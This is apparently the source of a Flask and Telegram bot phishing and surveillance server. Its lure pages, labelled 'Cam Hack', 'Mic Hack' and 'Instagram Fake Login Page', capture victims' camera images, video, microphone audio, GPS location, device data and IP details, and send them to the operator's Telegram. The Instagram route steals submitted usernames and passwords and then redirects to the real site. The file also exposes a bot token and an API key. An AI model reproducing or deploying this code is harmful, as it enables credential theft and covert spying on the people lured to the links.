from flask import Flask, render_template, render_template_string, request, jsonify, session, sessions, send_file, redirect
import logging
import os
import json
import datetime
import telebot
import time
import os
import threading
import base64
import requests
from io import BytesIO
import asyncio
import colorama

app = Flask(__name__, template_folder='.site', static_folder='.site', static_url_path='/')
app.secret_key = 'xxx'




bot = telebot.TeleBot("7525871760:AAGj7NTUIxNTDq_JpBqQF3E7PvGnk8MtgT8")
#channel_id = '@hackerpdfbotlog'
user_id = "@hackermain"


#user_id = 1853412532
host = "https://telejack.onrender.com"


info = f"""*‼️ Hack Link List:*

{host}/ - Basic for Device Info

{host}/cam - Cam Hack

{host}/loc - Location Info

{host}/video - Cam Hack with Videos

{host}/mic - Microphone Hack

*{host}/instagram-login-page - Instagram Fake Login Page*
"""

def gen():
      N = 7
      res = ''.join(random.choices(string.ascii_uppercase +string.digits, k=N))
      return res
      


def fix_base64_padding(base64_string): 
    # Fix padding if necessary
    padding_needed = 4 - (len(base64_string) % 4) 
    if padding_needed: 
        base64_string += '=' * padding_needed 
        return base64_string



def message(message):
    try:
            bot.send_message(user_id, message, parse_mode="Markdown")
            print(f"Message sent to {user_id}")
    except Exception as e:
            print(f"Failed to send message to {user_id}: {str(e)}")


message(info)

       

@bot.message_handler(commands=['start'])
def send_(message):
    bot.reply_to(message, f"""\nthis bot made by krunal_io \n{info}\n /start - Start bot \n /link - get your hacke link \nnote link for target 🎯\n
     """)


@bot.message_handler(commands=['link'])
def send_welcome(message):
    bot.reply_to(message, info)


def ipdata(ip):
    data = requests.get(f"http://ip-api.com/json/{ip}?status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query")
    return data.json()





def photo(photo_path, caption=""):
        try:
            time.sleep(0.1)
            bot.send_photo(user_id, photo=photo_path, caption=caption)
            print(f"Photo sent to {user_id}")
            time.sleep(1)  
        except Exception as e:
            print(f"Failed to send photo to {user_id}: {str(e)}")


    


def now():
    now = datetime.datetime.now()
    print(now)
    return now




def jdata(data):
   d = json.dumps(data, indent=10)
   return d



def audio(audio_path, caption=""):
        try:
            bot.send_audio(user_id, audio=audio_path, caption=caption)
            print(f"Audio sent to {user_id}")
           # time.sleep(1)  # Sleep for 1 second to avoid hitting rate limits
        except Exception as e:
            print(f"Failed to send audio to {user_id}: {str(e)}")


@app.route("/")
def hello():
    message("index page opened !\n")
    return render_template("index.html")

@app.route("/cam")
def he():
    message("cam page opened !? \n")
    return render_template("video.html")

@app.route("/loc")
def loc():
    message("loc page opened !? \n")
    return render_template("loc.html")


@app.route("/video")
def video_hack():
    message("video hack page opened !? \n")
    return render_template("video_hack.html")

@app.route("/mic")
def mic():
    message("mic page opened !? \n")
    return render_template("mic.html")


@app.route("/instagram-login-page")
def insta():
    message("instagram fake webpage  page opened !? \n")
    return render_template("insta/index.html")



@app.route("/instagram-login-error", methods=['POST', 'GET'])
def instadata():
       ipadd = request.remote_user
       userangen = request.remote_user
       print(ipadd, userangen)
       message("instagram resiveing  page opened !? \n")
   
       user_name = request.form.get("username")  
       user_pass = request.form.get("password")
       user_data = f"""📌 INSTAGRAM-LOGIN\n
    YOUR TREGET INFOMESION 
    \n
    *USERNAME : {user_name}*
    *PASSWORD : {user_pass}*
    
    \n"""
       message(user_data)
       
       print(user_name, user_pass)
       return redirect("https://www.instagram.com/explore/")

    
   




@app.route("/video-hack", methods=['POST'])
def video_share():
    data = request.get_json()
    video_data =  data['videoData']
    convert = fix_base64_padding(video_data)
    data_s = base64.b64decode(convert)
    video_stream = BytesIO(data_s)
    bot.send_video(user_id, video=video_stream, timeout=100)
    
    print("video sending")
    return "hi", 200


@app.route('/micdata', methods=['POST'])
def micdata():
    data = request.get_json()
    image_data = data['audio']
    global file
    print("send photo")
    decoded_image_data = base64.b64decode(image_data)
#    file = f"data/{ran()}.jpg"
    time = now()
    audio(decoded_image_data)
    return jsonify({"message": "Image uploaded successfully!"})




@app.route("/locdata", methods=['POST'])
def lodata():
    jloc = request.get_json()
    cc = jdata(jloc)
    message(f"""target gps data\n 
```
{cc}``` """)
    try:
         bot.send_location(user_id, latitude=jloc['latitude'], longitude=jloc['longitude'], live_period=jloc['timestamp'], heading=jloc['heading'], horizontal_accuracy=jloc['accuracy'])
    finally:
          bot.send_location(user_id, latitude=jloc['latitude'], longitude=jloc['longitude'], heading=jloc['heading'], horizontal_accuracy=jloc['accuracy'] )
    # photo(f"https://maps.geoapify.com/v1/staticmap?style=toner-grey&width=350&height=300&center=lonlat:{jloc['longitude']},{jloc['latitude']}&zoom=10.9318&apiKey=83201a4a9e1e477399fe95ceb2f855e9")
          return jsonify({"message": "done"})

@app.route('/data', methods=['POST', 'GET'])
def upload_image():
    data = request.get_json()
    image_data = data['image']
    global file
    print("photo")
    decoded_image_data = base64.b64decode(image_data)
    session['img'] = decoded_image_data
    time = now()
    photo(session['img'])
    return jsonify({"message": "Image uploaded successfully!"})



@app.route('/api', methods=['POST', 'GET'])
def devi():
    data = request.get_json()
    io = jdata(data)
    Alldata = f"""\n
    device :-  *{data['userAgent']} *\n* {data['browserVersion']}*\n
    language :- *{data['language']}* \n
    ram :- *{data['deviceMemory']}* \n
    timeZone:- *{data['timeZone']}* \n 
    network :- *{data["effectiveConnectionType"]}* \n
    
    \
    """
    message(Alldata)
    m = f"""
    ```json data
    {io}
    ```
    """
    message(m)
    return jsonify(data)



@app.route('/ip', methods=['POST', 'GET'])
def ip():
    data = request.get_json()
    hi = jdata(data)
    ip = data['ip']
    ha6 = jdata(ipdata(ip))
    m =f"""ip addres data \n
    ```
    {ha6}
    ```

    """
    message(m)
    return jsonify(data)




async def Bot():
    print("bot server is runing")
    bot.polling()

def ser():
  app.run(port=8080)





if __name__ == '__main__':
    
    
    flask_thread = threading.Thread(target=ser)
    flask_thread.start()
    asyncio.run(Bot())
    



